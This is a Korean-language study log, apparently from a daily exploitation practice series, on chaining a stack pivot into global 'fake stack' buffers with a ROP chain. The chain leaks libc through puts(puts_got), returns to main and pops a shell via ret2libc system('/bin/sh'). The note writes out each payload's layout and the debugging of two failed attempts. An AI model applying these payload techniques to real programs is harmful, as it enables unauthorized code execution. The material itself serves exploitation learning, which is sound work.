@@ -1,0 +1,60 @@
+##day54 pivot + rop chain 연결
+
+##목표
+pivot으로 libc_base leak 후 main으로 돌아와 ret2libc
+
+##exploit 구조
+nm -n ./day53_pivot | grep ' [Bb] ' 명령으로 먼저 전역변수 fake stack1, fake stack2, round_no를 확인
+puts@plt 가 있는걸 확인
+
+puts(puts_got)으로 leak 하기로 결정
+
+objdump에서 1차 입력이 전역변수 입력 즉 fake stack1에 입력하는 것 확인
+2차 입력은 작은 bof , 크기가 충분하지 않기 때문에 pivot
+payload1 구조는
+payload1 = b"\x00" * 0x300 - 어제와 같은 이유로 rsp가 전역변수 범위 밖으로 넘어가는걸 방지하기 위해
+					크기가 0x500 인 전역변수이기 때문에 300만큼 \x00으로 채우고 이후에 값 넣음
+payload1 += p64(fake1 + 0x100) - 전역변수 내부 즉 writable한 공간 8바이트 값을 넣어 안전하게 큰 의미없음
+payload1 += p64(pop_rdi)
+payload1 += p64(puts_got)
+payload1 += p64(puts_plt)
+payload1 += p64(main) - 2차 bof입력으로 pivot trigger역할을 하고 다시 메인으로 복귀하기 위해
+
+payload2 = b"A" * 80 - buf의 크기가 80인걸 disas vuln에서 확인함 rbp까지 덮으면 안되기때문에 buf크기만큼만
+payload2 += p64(fake1)
+payload2 += p64(leave_ret)
+
+이제 다시 main
+puts 주소가 leak됬으니 파싱해서 puts_leak - puts_offset으로 libc base를 구하고
+system, /bin/sh 주소를 각각 구했다
+
+payload3 = b"\x00" * 0x300
+payload3 += p64(fake1 + 0x100)
+payload3 += p64(ret) - aligment용 ret
+payload3 += p64(pop_rdi)
+payload3 += p64(binsh)
+payload3 += p64(system)
+
+2차로 전역변수에 값을 넣었으니 이제 trigger
+
+payload4 = b"A" * 80
+payload4 += p64(fake1)
+payload4 += p64(leave_ret)
+
+##1차시도 - 실패
+payload2 입력 후 main으로 돌아와 계속 입력을 기다린다 recvline()을 잘못사용했다고 판단 익스플로잇 코드를
+여러번 읽어보고 payload2 입력 직후 멈춰서 레지스터를 확인 값들 모두 정상 libc base 파싱도 정상
+
+##원인
+fake2, round_no 전역변수가 있었다는걸 잊었음 payload2입력 후 멈춤 read에 브레이크를 걸어서
+rsi, rdx 즉 read 의 2, 3 번째 인자를 확인해보니 첫번째 read에서는 rsi가 fake1인데 다시 main으로 복귀한 후
+read 에서는 rsi 가 fake2였다 round_no을 분기점으로 사용한듯
+
+##검증, 2차시도 - 실패
+payload3, 4 의 fake1을 모두 fake2로 고치고 실행
+이번에도 입력을 기다림 뭔가 놓친것이 있어보인다
+2차 main에서 프로그램 기본 출력이 달라진것이 있는지 확인
+1차 main에서는 1차입력 직전 출력이 stack 1이었는데 2차 main에서는 stack 2 이었다
+
+##검증, 3차시도
+recvuntil(b"stack 2\n") 로 바꾸고 시도 3차 시도 성공 쉘에 명령 입력도 성공
